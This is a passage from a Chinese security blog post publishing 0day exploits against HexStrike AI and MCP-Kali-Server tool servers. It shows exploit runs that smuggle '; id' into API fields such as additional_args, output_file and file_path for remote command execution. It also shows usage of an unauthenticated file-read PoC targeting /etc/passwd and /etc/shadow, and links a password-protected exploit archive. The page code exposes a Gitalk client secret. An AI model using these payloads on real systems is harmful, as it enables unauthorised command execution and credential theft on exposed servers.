class="line"></span><br><span class="line">[+] Command Output (stdout):</span><br><span class="line">----------------------------------------</span><br><span class="line"></span><br><span class="line">                   ←[1;97m______</span><br><span class="line">                  ←[1;97m/      \</span><br><span class="line">                 ←[1;97m(  Woof! )</span><br><span class="line">                  ←[1;97m\  ____/                      ←[1;91m)</span><br><span class="line">                  ←[1;97m,,                           ←[1;91m) (←[1;93m_</span><br><span class="line">             ←[1;93m.-. ←[1;97m-    ←[1;92m_______                 ←[1;91m( ←[1;93m|__|</span><br><span class="line">            ←[1;93m()``; ←[1;92m|==|_______)                ←[1;91m.)←[1;93m|__|</span><br><span class="line">            ←[1;93m/ (<span class="string">'        ←[1;92m/|\                  ←[1;91m(  ←[1;93m|__|</span></span><br><span class="line"><span class="string">        ←[1;93m(  /  )       ←[1;92m / | \                  ←[1;91m. ←[1;93m|__|</span></span><br><span class="line"><span class="string">         ←[1;93m\(_)_))      ←[1;92m/  |  \                   ←[1;93m|__|←[0m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                    ←[1;96m~ WAFW00F : ←[1;94mv2.3.1 ~←[1;97m</span></span><br><span class="line"><span class="string">    The Web Application Firewall Fingerprinting Toolkit</span></span><br><span class="line"><span class="string">    ←[0m</span></span><br><span class="line"><span class="string">[*] Checking https://localhost</span></span><br><span class="line"><span class="string">uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),103(scanner),107(bluetooth),124(lpadmin),132(wireshark),134(kaboxer)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">----------------------------------------</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[SUCCESS] RCE Confirmed! The injected command output was found in the server response.</span></span><br></pre></td></tr></tbody></table></figure>
+<p>0x005 uro端点RCE漏洞EXP</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">E:\tools\Ladon12\AIcode&gt;python poc_uro_rce.py http://192.168.18.10:8888 <span class="built_in">id</span></span><br><span class="line">[+] POC Target Endpoint: http://192.168.18.10:8888/api/tools/uro</span><br><span class="line">[+] Injecting via <span class="string">'additional_args'</span>: {<span class="string">"urls"</span>: <span class="string">"http://example.com/path?id=1"</span>, <span class="string">"whitelist"</span>: <span class="string">""</span>, <span class="string">"blacklist"</span>: <span class="string">""</span>, <span class="string">"additional_args"</span>: <span class="string">"; id"</span>}</span><br><span class="line">[+] Status Code: 200</span><br><span class="line">[+] stdout:</span><br><span class="line">----------------------------------------</span><br><span class="line">uid=1000(kali) gid=1000(kali) <span class="built_in">groups</span>=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(<span class="built_in">sudo</span>),29(audio),30(dip),44(video),46(plugdev),100(<span class="built_in">users</span>),101(netdev),103(scanner),107(bluetooth),124(lpadmin),132(wireshark),134(kaboxer)</span><br><span class="line"></span><br><span class="line">[+] stderr:</span><br><span class="line">/bin/sh: 1: uro: not found</span><br><span class="line"></span><br><span class="line">----------------------------------------</span><br><span class="line"></span><br><span class="line">[SUCCESS] RCE Confirmed via /api/tools/uro additional_args injection!</span><br></pre></td></tr></tbody></table></figure>
+<p>0x006 anew端点RCE漏洞EXP</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">E:\tools\Ladon12\AIcode&gt;python poc_anew_rce.py http://192.168.18.10:8888 <span class="built_in">id</span></span><br><span class="line">[+] POC Target Endpoint: http://192.168.18.10:8888/api/tools/anew</span><br><span class="line">[+] Injecting via <span class="string">'output_file'</span>: {<span class="string">"input_data"</span>: <span class="string">"http://example.com"</span>, <span class="string">"output_file"</span>: <span class="string">"/tmp/out.txt; id"</span>, <span class="string">"additional_args"</span>: <span class="string">""</span>}</span><br><span class="line">[+] Status Code: 200</span><br><span class="line">[+] stdout:</span><br><span class="line">----------------------------------------</span><br><span class="line">uid=1000(kali) gid=1000(kali) <span class="built_in">groups</span>=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(<span class="built_in">sudo</span>),29(audio),30(dip),44(video),46(plugdev),100(<span class="built_in">users</span>),101(netdev),103(scanner),107(bluetooth),124(lpadmin),132(wireshark),134(kaboxer)</span><br><span class="line"></span><br><span class="line">[+] stderr:</span><br><span class="line">/bin/sh: 1: anew: not found</span><br><span class="line"></span><br><span class="line">----------------------------------------</span><br><span class="line"></span><br><span class="line">[SUCCESS] RCE Confirmed via /api/tools/anew output_file injection!</span><br></pre></td></tr></tbody></table></figure>
+<p>0x007  exiftool端点RCE漏洞EXP</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">E:\tools\Ladon12\AIcode&gt;python poc_exiftool_rce.py http://192.168.18.10:8888 <span class="built_in">id</span></span><br><span class="line">[+] POC Target Endpoint: http://192.168.18.10:8888/api/tools/exiftool</span><br><span class="line">[+] Injecting via <span class="string">'file_path'</span>: {<span class="string">"file_path"</span>: <span class="string">"/tmp/nonexistent.jpg; id"</span>, <span class="string">"output_format"</span>: <span class="string">""</span>, <span class="string">"tags"</span>: <span class="string">""</span>, <span class="string">"additional_args"</span>: <span class="string">""</span>}</span><br><span class="line">[+] Status Code: 200</span><br><span class="line">[+] stdout:</span><br><span class="line">----------------------------------------</span><br><span class="line">uid=1000(kali) gid=1000(kali) <span class="built_in">groups</span>=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(<span class="built_in">sudo</span>),29(audio),30(dip),44(video),46(plugdev),100(<span class="built_in">users</span>),101(netdev),103(scanner),107(bluetooth),124(lpadmin),132(wireshark),134(kaboxer)</span><br><span class="line"></span><br><span class="line">[+] stderr:</span><br><span class="line">Error: File not found - /tmp/nonexistent.jpg</span><br><span class="line"></span><br><span class="line">----------------------------------------</span><br><span class="line"></span><br><span class="line">[SUCCESS] RCE Confirmed via /api/tools/exiftool file_path injection!</span><br></pre></td></tr></tbody></table></figure>
+<h2 id="十、Kali-MCP-多个RCE-0day漏洞">十、Kali MCP 多个RCE 0day漏洞</h2>
+<p>发现它和hexstrike代码差不多，存在完全一致漏洞点，时间有点久，我已记不起它俩，谁先开发的<br>
+肯定有一个是基于另一个代码修改的，只是一个MCP工具多，一个少而已，但是都一样的危险，哈哈</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">python mks_arbitrary_file_read_poc.py -t http://192.168.18.10:5000 -f /etc/passwd -m nmap</span><br><span class="line">基本用法</span><br><span class="line">python mks_arbitrary_file_read_poc.py -t http://192.168.18.10:5000 -f /etc/passwd</span><br><span class="line"></span><br><span class="line">指定 nmap 向量并落盘</span><br><span class="line">python mks_arbitrary_file_read_poc.py -t http://TARGET:5000 -f /etc/group -m nmap -o group.txt</span><br><span class="line"></span><br><span class="line">全向量尝试</span><br><span class="line">python mks_arbitrary_file_read_poc.py -t http://TARGET:5000 -f /etc/os-release --all</span><br><span class="line"></span><br><span class="line">调试模式（输出原始 HTTP 响应）</span><br><span class="line">python mks_arbitrary_file_read_poc.py -t http://TARGET:5000 -f /etc/shadow -m nmap --raw</span><br></pre></td></tr></tbody></table></figure>
+<h3 id="任意文件读取漏洞">任意文件读取漏洞</h3>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">  __  __ _  __ ___        _    ___ ___    ___  ___   ___</span><br><span class="line"> |  \/  | |/ // __|_____ | |  | __| _ \  | _ \/ _ \ / __|</span><br><span class="line"> | |\/| | <span class="string">' &lt; \__ \_____|| |__| _||   /  |  _/ (_) | (__</span></span><br><span class="line"><span class="string"> |_|  |_|_|\_\|___/      |____|_| |_|_\  |_|  \___/ \___|</span></span><br><span class="line"><span class="string"> MCP-Kali-Server :: Unauthenticated Arbitrary File Read</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Target : http://192.168.18.10:5000</span></span><br><span class="line"><span class="string">[*] File   : /etc/passwd</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Vector: nmap  -iL</span></span><br><span class="line"><span class="string">[+] nmap: recovered 3277 bytes in 13.83s</span></span><br><span class="line"><span class="string">------------------------------------------------------------</span></span><br><span class="line"><span class="string">root:x:0:0:root:/root:/usr/bin/zsh</span></span><br><span class="line"><span class="string">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span></span><br></pre></td></tr></tbody></table></figure>
+<h2 id="十一、AI生成的EXP脚本">十一、AI生成的EXP脚本</h2>
+<p><img alt="image" class="lazyload" data-src="/k8img/ai/mcp/hexstrike/poc.png"></p>
+<p>下载： <a href="http://k8gege.org/ai/kali_hextrike_0day.rar">http://k8gege.org/ai/kali_hextrike_0day.rar</a></p>
+<p>password: k8gege</p>
+<h2 id="免责声明">免责声明</h2>
+<pre><code>使用EXP请遵循相关法律法规，确保在授权的环境中进行测试和使用。
+本工具仅供教育和研究目的，任何滥用行为将由用户自行承担后果。
+</code></pre>
+
+		<h3 id="copy">转载声明</h3> <p>K8博客文章随意转载，转载请注明出处！ © K8gege  <a href="http://k8gege.org" target="_blank">http://k8gege.org</a></p>
+
+    </div>
+
+    
+    <div class="reward" ontouchstart="">
+    <div class="reward-wrap">
+	<img height="180" width="180" class="lazyload" data-src="../images/k8join2.png">
+
+    </div>
+    <p class="reward-tip">
+        扫码加入K8小密圈
+    </p>
+</div>
+    
+    <div class="post-footer">
+        <div>
+            
+            转载声明：
+            K8博客文章随意转载，转载请注明出处！ © <a href="http://k8gege.org" target="_blank">K8gege</a>
+            
+            
+        </div>
+        <div>
+            
+        </div>
+    </div>
+</article>
+<div class="article-nav prev-next-wrap clearfix">
+    
+    
+    <a href="/p/aibreak.html" class="next-post btn btn-default" title="AI攻防 Gemini大模型越狱提示词">
+        <span class="hidden-lg">下一篇</span>
+        <span class="hidden-xs">
+            AI攻防 Gemini大模型越狱提示词</span><i class="fa fa-angle-right fa-fw"></i>
+    </a>
+    
+</div>
+
+<div id="comments">
+    
+<link rel="stylesheet" href="https://cdn.bootcss.com/gitalk/1.4.1/gitalk.min.css">
+<script src="//cdn.bootcss.com/gitalk/1.4.1/gitalk.min.js"></script>
+<script src="//cdn.bootcss.com/blueimp-md5/2.9.0/js/md5.min.js"></script>
+<div id="gitalk-container"></div>
+<script type="text/javascript">
+var gitalk = new Gitalk({
+    // Gitalk配置
+    language: "en",
+    clientID: "b2247720d5b50a30fbe7",
+    clientSecret: "fbd720b7c84bea4de2ac3bef40b37509ccca0267",
+    repo: "k8gege.github.io",
+    owner: "k8gege",
+    admin: ["k8gege"],
+    id: md5(location.pathname),
+    distractionFreeMode: true
+});
+gitalk.render('gitalk-container');
+</script>
+
+</div>
+
+
+
+                </main>
+                
+                    <aside id="article-toc" role="navigation" class="col-md-4">
+    <div class="widget">
+        <h3 class="title">
+            Table of Contents
+        </h3>
+        
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">HexStrike AI v6.0 - 代码审计报告</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#RCE-%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E5%88%86%E6%9E%90-MCP%E5%8D%8F%E8%AE%AE%E6%94%BB%E5%87%BB%E5%90%91%E9%87%8F"><span class="toc-text">RCE 漏洞深度分析 (MCP协议攻击向量)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%A6%81"><span class="toc-text">一、漏洞概要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%9E%B6%E6%9E%84%E5%88%86%E6%9E%90"><span class="toc-text">二、架构分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-hexstrike-server-py-Flask-Web-%E5%90%8E%E7%AB%AF"><span class="toc-text">2.1 hexstrike_server.py (Flask Web 后端)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-hexstrike-mcp-py-FastMCP-%E5%AE%A2%E6%88%B7%E7%AB%AF"><span class="toc-text">2.2 hexstrike_mcp.py (FastMCP 客户端)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-MCP-%E5%8D%8F%E8%AE%AE%E9%80%9A%E4%BF%A1%E6%B5%81%E7%A8%8B"><span class="toc-text">2.3 MCP 协议通信流程</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E6%BC%8F%E6%B4%9E%E8%AF%A6%E6%83%85"><span class="toc-text">三、漏洞详情</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-%E6%BC%8F%E6%B4%9E-1-%E4%B8%BB%E6%BC%8F%E6%B4%9E-api-command-%E6%97%A0%E9%9C%80%E8%AE%A4%E8%AF%81%E7%9A%84RCE"><span class="toc-text">3.1 漏洞 #1 (主漏洞): /api/command 无需认证的RCE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-%E6%BC%8F%E6%B4%9E-2-api-debug-execute-%E5%92%8C-api-debug-eval-Debug%E6%A8%A1%E5%BC%8F"><span class="toc-text">3.2 漏洞 #2: /api/debug/execute 和 /api/debug/eval (Debug模式)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-%E6%BC%8F%E6%B4%9E-3-api-scan-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5-%E9%9C%80%E8%AE%A4%E8%AF%81"><span class="toc-text">3.3 漏洞 #3: /api/scan 命令注入 (需认证)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-4-%E6%BC%8F%E6%B4%9E-4-SSTI-%E9%9C%80%E8%AE%A4%E8%AF%81"><span class="toc-text">3.4 漏洞 #4: SSTI (需认证)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-5-%E6%BC%8F%E6%B4%9E-5-MCP%E5%8D%8F%E8%AE%AE%E5%B1%82%E5%88%A9%E7%94%A8"><span class="toc-text">3.5 漏洞 #5: MCP协议层利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E6%94%BB%E5%87%BB%E9%9D%A2%E6%80%BB%E7%BB%93"><span class="toc-text">四、攻击面总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81MCP%E5%8D%8F%E8%AE%AERCE%E6%94%BB%E5%87%BB%E9%93%BE"><span class="toc-text">五、MCP协议RCE攻击链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-FastMCP-JSON-RPC-%E5%B7%A5%E5%85%B7%E8%B0%83%E7%94%A8%E6%9C%BA%E5%88%B6"><span class="toc-text">5.1 FastMCP JSON-RPC 工具调用机制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-2-HexStrike%E4%B8%AD%E7%9A%84MCP%E5%B7%A5%E5%85%B7%E6%98%A0%E5%B0%84"><span class="toc-text">5.2 HexStrike中的MCP工具映射</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-3-%E9%80%9A%E8%BF%87MCP%E5%8D%8F%E8%AE%AE%E8%A7%A6%E5%8F%91RCE"><span class="toc-text">5.3 通过MCP协议触发RCE</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AD%E3%80%81%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE"><span class="toc-text">六、修复建议</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#6-1-%E7%B4%A7%E6%80%A5%E4%BF%AE%E5%A4%8D-P0"><span class="toc-text">6.1 紧急修复 (P0)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-2-%E6%B7%B1%E5%BA%A6%E4%BF%AE%E5%A4%8D-P1"><span class="toc-text">6.2 深度修复 (P1)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-3-%E6%9E%B6%E6%9E%84%E6%94%B9%E8%BF%9B-P2"><span class="toc-text">6.3 架构改进 (P2)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%83%E3%80%81%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8POC"><span class="toc-text">七、漏洞利用POC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BF%AB%E9%80%9F%E9%AA%8C%E8%AF%81"><span class="toc-text">快速验证:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AB%E3%80%81%E7%9B%AE%E6%A0%87%E7%8E%AF%E5%A2%83%E4%BF%A1%E6%81%AF-%E5%B7%B2%E8%8E%B7%E5%8F%96"><span class="toc-text">八、目标环境信息 (已获取)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B9%9D%E3%80%81hexstrike-0day%E6%BC%8F%E6%B4%9EExp%E5%9B%BE%E6%96%87%E6%BC%94%E7%A4%BA"><span class="toc-text">九、hexstrike 0day漏洞Exp图文演示</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%81%E3%80%81Kali-MCP-%E5%A4%9A%E4%B8%AARCE-0day%E6%BC%8F%E6%B4%9E"><span class="toc-text">十、Kali MCP 多个RCE 0day漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E"><span class="toc-text">任意文件读取漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%81%E4%B8%80%E3%80%81AI%E7%94%9F%E6%88%90%E7%9A%84EXP%E8%84%9A%E6%9C%AC"><span class="toc-text">十一、AI生成的EXP脚本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%8D%E8%B4%A3%E5%A3%B0%E6%98%8E"><span class="toc-text">免责声明</span></a></li></ol></li></ol>
+        
+    </div>
+</aside>
+                
+            </div>
+        </div>
+    </section>
+    <footer class="main-footer">
+    <div class="container">
+        <div class="row">
+        </div>
+    </div>
+</footer>
+<a id="back-to-top" class="icon-btn hide">
+    <i class="fa fa-chevron-up"></i>
+</a>
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?0f0409af9df7ad2cc43cc334b4d9b515";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+ <script type="text/javascript" src="http://libs.baidu.com/jquery/1.11.1/jquery.min.js"></script>
+ <script src="https://cdn.bootcdn.net/ajax/libs/lazysizes/5.3.2/lazysizes.min.js" async=""></script>
+
+    <div class="copyright">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="busuanzi">
+    
+    Total:
+    <strong id="busuanzi_value_site_pv">
+        <i class="fa fa-spinner fa-spin"></i>
+    </strong>
+	<!-- 
+    &nbsp; | &nbsp;
+    
+	Visitors:
+    <strong id="busuanzi_value_site_uv">
+        <i class="fa fa-spinner fa-spin"></i> 
+    </strong>
+	-->
+    
+</div>
+            </div>
+            <div class="col-sm-12">
+                <span>Copyright ©
+                    2020
+                    
+                </span> |
+                <span>
+                    Powered by <a href="//k8gege.org" class="copyright-links" target="_blank" rel="nofollow">K8gege</a>
+                </span>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<script src="/assets/tagcanvas.min.js?rev=2.9.js"></script>
+
+<script>
+var tagOption = {
+    textColour: '#444', // 字体颜色
+    outlineMethod: 'block', // 选中模式
+    outlineColour: '#FFDAB9', // 选中模式的颜色
+    interval: 30 || 30, // 动画帧之间的时间间隔，值越大，转动幅度越大
+    textHeight: 13,
+    outlineRadius: 3,
+    freezeActive: true || '', // 选中的标签是否继续滚动
+    frontSelect: true || '', // 不选标签云后部的标签
+    initial: [0.1, -0.1],
+    depth: 0.5,
+    decel: 0.95,
+    maxSpeed: 0.03,
+    reverse: true || '', // 是否反向触发
+    fadeIn: 500, // 进入动画时间
+    wheelZoom: false || '' // 是否启用鼠标滚轮
+}
+TagCanvas.Start('tag-cloud-3d', '', tagOption);
+</script>
+
+
+<script async="" src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+<script src="/js/app.js?rev=@@hash.js"></script>
+
+
+</body></html>
